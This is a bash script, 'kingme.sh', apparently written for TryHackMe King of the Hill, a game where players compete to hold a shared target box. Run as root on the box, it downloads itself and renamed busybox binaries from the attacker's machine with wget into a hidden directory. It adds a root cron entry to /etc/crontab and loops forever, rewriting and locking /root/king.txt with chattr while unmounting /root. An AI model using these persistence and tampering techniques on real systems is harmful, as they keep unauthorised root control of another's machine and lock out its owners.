#!/bin/bash
#
# /$$   /$$ /$$$$$$ /$$   /$$  /$$$$$$        /$$      /$$ /$$$$$$$$
#| $$  /$$/|_  $$_/| $$$ | $$ /$$__  $$      | $$$    /$$$| $$_____/
#| $$ /$$/   | $$  | $$$$| $$| $$  \__/      | $$$$  /$$$$| $$      
#| $$$$$/    | $$  | $$ $$ $$| $$ /$$$$      | $$ $$/$$ $$| $$$$$   
#| $$  $$    | $$  | $$  $$$$| $$|_  $$      | $$  $$$| $$| $$__/   
#| $$\  $$   | $$  | $$\  $$$| $$  \ $$      | $$\  $ | $$| $$      
#| $$ \  $$ /$$$$$$| $$ \  $$|  $$$$$$/      | $$ \/  | $$| $$$$$$$$
#|__/  \__/|______/|__/  \__/ \______/       |__/     |__/|________/ v1.0                         
#
# Auto king script for THM KotH
# Written by Squ1rr3l (aka redsquirrel_7)
#
# DISCLAIMER: I'm pretty sure this isn't against the rules, but
# I am not responsible if you get banned for using this script!

WORKING_DIR=/var/kingme	# Secret working dir

# Parse them args!
POSITIONAL_ARGS=()

while [[ $# -gt 0 ]]; do
  case $1 in
    # Get the THM username to put in king.txt
    -u|--username)
      HACKER_NAME="$2"
      shift
      shift
      ;;
    # Get the IP address of the attacker machine for downloading bins/scripts
    -i|--ipaddr)
      HACKER_IP="$2"
      shift
      shift
      ;;
    # Get the secret working dir
    -d|--directory)
      WORKING_DIR="$2"
      shift
      shift
      ;;
    # Print some helper text
    -h|--help)
      echo -e "Usage: ./kingme.sh -u <thm username> -i <your ip> -d <directory>\n\n-u: Your TryHackMe username to put in king.txt\n-i: The IP address of your attacker machine (needed to copy bins)\n-d: Secret working directory for all your bins and the script to work out of. Defaults to /var/kingme."
      exit 1
      shift
      shift
      ;;
    # What the balls m8!? That's not an options!
    -*|--*)
      echo "Unknown option $1. Use -h for help"
      exit 1
      ;;
    *)
      POSITIONAL_ARGS+=("$1")
      shift
      ;;
  esac
done

set -- "${POSITIONAL_ARGS[@]}"

# Error checking (kind of)
if [ -z $HACKER_NAME ]
then
	echo "You need to enter a THM username and an IP address. Use -h for more help."
	exit 1
elif [ -z $HACKER_IP ]
then
	echo "You need to enter a THM username and an IP address. Use -h for more help."
	exit 1
fi

# Set us up a secret working directory
mkdir $WORKING_DIR
cd $WORKING_DIR

# Copy all the bins here and the kingme script as a backup
# Removed all the curl commands since it seems most boxes have wget and not curl
# I'll add them back if I'm proven wrong
wget http://$HACKER_IP:8080/kingme.sh
wget http://$HACKER_IP:8080/busybox_GREP
wget http://$HACKER_IP:8080/busybox_ECHO
wget http://$HACKER_IP:8080/busybox_CHATTR
wget http://$HACKER_IP:8080/busybox_CHMOD
wget http://$HACKER_IP:8080/busybox_CAT

# Rename them bins!
mv -v busybox_GREP grep
mv -v busybox_ECHO echo
mv -v busybox_CHATTR chattr
mv -v busybox_CHMOD chmod
mv -v busybox_CAT cat

# All this stuff needs to be executable
chmod u+x kingme.sh
chmod u+x grep
chmod u+x echo
chmod u+x chattr
chmod u+x chmod
chmod u+x cat


# Make sure our script runs again even if our shell gets borked
$WORKING_DIR/echo -e "#!/bin/bash\n# Just in case our shell gets borked\n# to be run as a cron job\n#\nHACKER_NAME=$HACKER_NAME\n\nif $WORKING_DIR/grep -q $HACKER_NAME /root/king.txt; then\n	echo "you are king"\n	exit\nelse\n	while true\n	do\n		if $WORKING_DIR/grep -q $HACKER_NAME /root/king.txt; then\n			$WORKING_DIR/echo $HACKER_NAME "is king! Nothing to do!"\n		else\n			$WORKING_DIR/chattr -ai /root/king.txt\n			$WORKING_DIR/chmod u+w /root/king.txt\n			set +o noclobber /root/king.txt\n			$WORKING_DIR/echo $HACKER_NAME > /root/king.txt\n			$WORKING_DIR/chattr +ai /root/king.txt\n			set -o noclobber /root/king.txt\n		fi\n		sleep 1\n	done\nfi\n" > $WORKING_DIR/kingcron.sh

$WORKING_DIR/chmod u+x $WORKING_DIR/kingcron.sh
$WORKING_DIR/echo "* * * * *  root  $WORKING_DIR/kingcron.sh" >> /etc/crontab


# Forever take your rightful throne as king!!!
while true
do
	if $WORKING_DIR/grep -q $HACKER_NAME /root/king.txt; then
		$WORKING_DIR/echo $HACKER_NAME "is king! Nothing to do!"
	else
		LOSER=$($WORKING_DIR/cat /root/king.txt)
		$WORKING_DIR/echo $LOSER "dethroned you! Making" $HACKER_NAME "king once again!"
		umount /root
		$WORKING_DIR/chattr -ai /root/king.txt
		$WORKING_DIR/chmod u+w /root/king.txt
		set +o noclobber /root/king.txt
		$WORKING_DIR/echo $HACKER_NAME > /root/king.txt
		$WORKING_DIR/chattr +ai /root/king.txt
		set -o noclobber /root/king.txt
	fi
	sleep 1
done
